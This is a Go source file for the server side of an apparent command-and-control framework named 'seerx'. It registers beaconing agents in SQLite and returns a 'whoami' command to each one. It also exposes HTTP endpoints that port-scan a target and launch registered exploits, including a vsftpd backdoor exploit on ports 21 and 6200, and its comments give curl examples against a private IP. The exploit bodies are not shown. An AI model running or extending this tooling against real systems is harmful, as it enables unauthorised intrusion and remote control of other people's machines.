package server

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/flaskbush/seerx/c2/models"
	"github.com/flaskbush/seerx/exploits"
	"github.com/flaskbush/seerx/exploits/vsftpd"
	"github.com/flaskbush/seerx/recon"
	"github.com/gorilla/mux"
	_ "github.com/mattn/go-sqlite3"
)

type Server struct {
	db          *sql.DB
	agents      map[string]*models.Agent
	mutex       sync.Mutex
	exploitMgr  *exploits.ExploitManager
	portScanner *recon.PortScanner
}

// Database
func NewServer(dbPath string) (*Server, error) {
	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		return nil, fmt.Errorf("échec ouverture DB: %v", err)
	}

	// Init agent table
	_, err = db.Exec(`
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            ip TEXT,
            last_seen TIMESTAMP
        )
    `)
	if err != nil {
		return nil, fmt.Errorf("table creation failed: %v", err)
	}

	server := &Server{
		db:          db,
		agents:      make(map[string]*models.Agent),
		exploitMgr:  exploits.NewExploitManager(),
		portScanner: recon.NewPortScanner(),
	}

	server.exploitMgr.Register(vsftpd.NewVsftpdExploit("21", "6200"))

	return server, nil
}

func (s *Server) RegisterAgent(agent *models.Agent) error {
	s.mutex.Lock()
	defer s.mutex.Unlock()

	s.agents[agent.ID] = agent
	_, err := s.db.Exec(
		"INSERT OR REPLACE INTO agents (id, ip, last_seen) VALUES (?, ?, ?)",
		agent.ID, agent.IP, agent.LastSeen,
	)
	return err
}

// Http API
func (s *Server) HandleBeacon(w http.ResponseWriter, r *http.Request) {
	var agent models.Agent
	if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
		http.Error(w, "Invalid payload", http.StatusBadRequest)
		return
	}

	agent.LastSeen = time.Now()
	if err := s.RegisterAgent(&agent); err != nil {
		http.Error(w, "Failed to register agent", http.StatusInternalServerError)
		return
	}

	response := map[string]string{"command": "whoami"}
	json.NewEncoder(w).Encode(response)
}

// curl -X POST "http://localhost:8080/exploit/vsftpd?target=192.168.88.112"
func (s *Server) HandleExploit(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	exploitName := vars["name"]
	target := r.URL.Query().Get("target")

	if err := s.exploitMgr.RunExploit(exploitName, target); err != nil {
		http.Error(w, fmt.Sprintf("Exploit failed: %v", err), http.StatusInternalServerError)
		return
	}
	fmt.Fprintf(w, "Exploit %s executed on %s", exploitName, target)
}

// curl -s "http://localhost:8080/scan?target=192.168.88.112" | jq '.'
func (s *Server) HandleScan(w http.ResponseWriter, r *http.Request) {
	target := r.URL.Query().Get("target")
	ports, err := s.portScanner.Scan(target, "1-1024")
	if err != nil {
		http.Error(w, fmt.Sprintf("Scan failed: %v", err), http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(ports)
}

// Getter methods
func (s *Server) GetPortScanner() *recon.PortScanner {
	return s.portScanner
}

func (s *Server) GetExploitManager() *exploits.ExploitManager {
	return s.exploitMgr
}

func (s *Server) GetAgents() map[string]*models.Agent {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	return s.agents
}

func (s *Server) Start(addr string) error {
	router := mux.NewRouter()
	router.HandleFunc("/beacon", s.HandleBeacon).Methods("POST")
	router.HandleFunc("/exploit/{name}", s.HandleExploit).Methods("POST")
	router.HandleFunc("/scan", s.HandleScan).Methods("GET")

	log.Printf("C2 server started on %s", addr)
	return http.ListenAndServe(addr, router)
}
